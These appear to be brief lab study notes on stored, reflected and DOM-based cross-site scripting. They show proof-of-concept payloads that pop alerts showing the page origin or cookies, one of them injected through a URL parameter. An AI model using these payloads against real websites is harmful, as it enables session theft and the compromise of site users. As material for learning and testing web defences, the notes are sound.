# Stored XXS
Testing a payload
`<script>alert(window.origin)</script>`

You can see the alert and by viewing the page source you can see the payload.
```html
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script> </ul></ul>
```
To get the cookie you can do the following
`<script>alert(document.cookie)</script>`

# Reflected XXS
With this doing the classic 
`<script>alert(document.cookie)</script>`
Show up in the URL
`http://IP:port/index.php?task=<script>alert(document.cookie)</script>`


# DOM XSS
`No-Persistent`
When performing attacks you will not see input or output, or source code changes but seeing script.js.

Now running something like
```html
<img src="" onerror=alert(window.origin)>
```